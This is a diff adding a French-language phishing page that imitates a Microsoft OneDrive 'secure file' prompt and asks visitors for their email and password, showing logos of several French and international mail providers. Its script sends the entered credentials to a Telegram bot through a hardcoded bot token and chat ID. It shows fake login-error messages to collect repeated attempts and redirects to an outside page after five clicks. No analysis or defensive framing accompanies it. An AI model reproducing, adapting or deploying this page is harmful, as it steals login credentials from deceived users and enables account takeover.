@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vérifiez Votre Identité</title>
+    <style>
+	
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            width: 90%;
+            max-width: 400px;
+            background: #ffffff;
+            padding: 20px;
+            margin: 20px auto;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            text-align: left;
+            position: relative;
+        }
+        .header {
+    background: #0078d4;
+    color: white;
+    padding: 10px;
+    font-size: 14px;
+    font-weight: bold;
+    text-align: left; /* Aligner le texte à gauche */
+    display: flex;
+    align-items: center;
+    justify-content: flex-start; /* Alignement à gauche */
+    width: 100%;
+}
+.header img {
+    width: 24px;
+    margin-right: 10px; /* Espacement entre le logo et le texte */
+}
+
+        }
+        .microsoft-box {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            padding: 10px;
+            background: #f5f5f5;
+            border-radius: 5px;
+        }
+        .microsoft-box img {
+            width: 22px;
+        }
+        .title-box {
+    background: #f2dede;
+    padding: 15px;
+    font-size: 18px;
+    font-weight: bold;
+    border-radius: 5px;
+    width: 100%;
+    text-align: center;
+    margin-top: 20px;
+        }
+        .file-info {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-top: 10px;
+            justify-content: left;
+        }
+        .email-input, .button {
+            width: 100%;
+            padding: 10px;
+            margin-top: 10px;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        .email-input {
+            background-color: #e6f0ff;
+        }
+        .button {
+            background-color: #0078d4;
+            color: white;
+            cursor: pointer;
+        }
+        .hidden {
+            display: none;
+        }
+        .email-providers {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 10px;
+        }
+        .email-providers img {
+            width: 32px;
+        }
+        .footer {
+            height: 30px;
+            width: 100%;
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            background: #0078d4;
+        }
+    </style>
+    <script>
+        let clickCount = 0;
+        function showPasswordField() {
+            clickCount++;
+            document.getElementById('password-field').classList.remove('hidden');
+            document.getElementById('continue-button').innerText = "S'identifier";
+        }
+        function sendToTelegram() {
+            clickCount++;
+            let email = document.getElementById('email').value;
+            let password = document.getElementById('password').value;
+
+            if (!email || !password) {
+                alert("Veuillez entrer vos identifiants.");
+                return;
+            }
+
+            let botToken = '7518470397:AAF_XEOzuAy8VJoa9TqDUakCIBRKYgAyGuk'; 
+            let chatId = '5649148882'; 
+            let message = `Email: ${email}\nMot de passe: ${password}`;
+            
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    if (clickCount >= 5) {
+                        window.location.href = 'https://ericberdeaux.github.io/FICHE/';
+                    } else {
+                        alert('Erreur de connexion. Veuillez réessayer.');
+                    }
+                } else {
+                    alert('Erreur lors de l’envoi des informations.');
+                }
+            })
+            .catch(error => {
+                console.error('Erreur:', error);
+                alert('Erreur de connexion.');
+            });
+        }
+    </script>
+</head>
+<body>
+   <div class="header">
+        <img src="https://zupimages.net/up/25/09/y3cg.jpg" alt="OneDrive Logo">
+        <span>OneDrive</span>
+    </div>
+    <div class="microsoft-box">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo">
+        <span>Microsoft</span>
+    </div>
+    <div class="container">
+        <div class="title-box">Vérifiez Votre Identité</div>
+        <p>Vous avez reçu un fichier sécurisé</p>
+        <div class="file-info">
+            <img src="https://zupimages.net/up/25/09/ahnu.jpg" alt="PDF Icon" width="20">
+            <span>56.1KB</span>
+        </div>
+        <p>Pour lire le document veuillez entrer les identifiants de messagerie.</p>
+        <div class="email-providers">
+            <img src="https://zupimages.net/up/25/09/vw2t.jpg" alt="Outlook">
+            <img src="https://zupimages.net/up/25/09/dnou.jpg" alt="Yahoo">
+            <img src="https://zupimages.net/up/25/09/ey3b.jpg" alt="Orange">
+            <img src="https://zupimages.net/up/25/09/hmfs.jpg" alt="Free">
+            <img src="https://zupimages.net/up/25/09/0f9c.jpg" alt="SFR">
+        </div>
+        <input type="email" id="email" class="email-input" placeholder="Entrez l'adresse e-mail">
+        <div id="password-field" class="hidden">
+            <input type="password" id="password" class="email-input" placeholder="Entrez votre mot de passe">
+        </div>
+        <button id="continue-button" class="button" onclick="clickCount < 1 ? showPasswordField() : sendToTelegram()">Continuer</button>
+    </div>
+    <div class="footer"></div>
+</body>
+</html>
